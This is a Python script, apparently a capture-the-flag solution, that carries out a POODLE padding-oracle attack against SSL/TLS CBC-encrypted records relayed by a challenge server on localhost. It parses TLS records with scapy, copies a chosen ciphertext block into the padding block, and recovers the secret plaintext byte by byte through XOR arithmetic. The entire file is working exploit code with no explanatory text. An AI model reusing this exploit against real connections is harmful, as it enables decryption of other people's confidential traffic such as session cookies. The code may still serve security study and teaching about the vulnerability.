#!/usr/bin/env python

import socket
import sys
import scapy.all as scapy
sys.path.append("scapy-ssl_tls/src/scapy/layers")
from ssl_tls import *

CHALLENGE_ENDPOINT = ("localhost", 4747)
ORIGIN_CLIENT = "C"
ORIGIN_SEPARATOR = "-"

BLOCK_LENGTH = 16;
BODY_LAMBDA = 6

TLS_CONTENT_TYPE_APPLICATION_DATA = dict(((v, k) for k, v in TLS_CONTENT_TYPES.iteritems()))["application_data"]

a_count = 30

while True:
	s = socket.create_connection(CHALLENGE_ENDPOINT)
	f = s.makefile(bufsize=0)
	post_as = "a" * a_count
	post_body_as = "a" * (BLOCK_LENGTH - ((a_count + BODY_LAMBDA) % BLOCK_LENGTH))
	#print post_as, post_body_as
	f.write('post("/%s", "%s");\n' % (post_as, post_body_as))

	l = f.readline()
	while l:
		tls_record = None
		splitted = l.split(ORIGIN_SEPARATOR, 1)
		if len(splitted) > 1:
			origin, encoded_data = splitted
			if origin == ORIGIN_CLIENT:
				data = encoded_data.decode("base64")
				tls_record = TLSRecord(data)
				if tls_record.content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
					encrypted_blocks = tls_record.length / BLOCK_LENGTH
					if len(tls_record.load) > tls_record.length:
						load_excess = tls_record.load[tls_record.length:]
						tls_record.load = tls_record.load[:tls_record.length]
						second_tls_record = TLSRecord(load_excess)
						tls_record = tls_record/second_tls_record
						encrypted_blocks = second_tls_record.length / BLOCK_LENGTH
					#print encrypted_blocks
					#print origin, tls_record.show()
					#print second_tls_record.length
					# <POODLE>
					data_minus_last_block = data[:-BLOCK_LENGTH]
					first_block = data[-BLOCK_LENGTH*encrypted_blocks:-BLOCK_LENGTH*(encrypted_blocks-1)]
					second_block = data[-BLOCK_LENGTH*(encrypted_blocks-1):-BLOCK_LENGTH*(encrypted_blocks-2)]
					second_to_last_block = data_minus_last_block[-BLOCK_LENGTH:]
					data = data_minus_last_block + second_block
					l = origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"
					# </POODLE>
			f.write(l)
		else:
			print chr(((BLOCK_LENGTH - 1) ^ ord(second_to_last_block[-1]) ^ ord(first_block[-1])))
			a_count -= 1
		l = f.readline()

print "END"
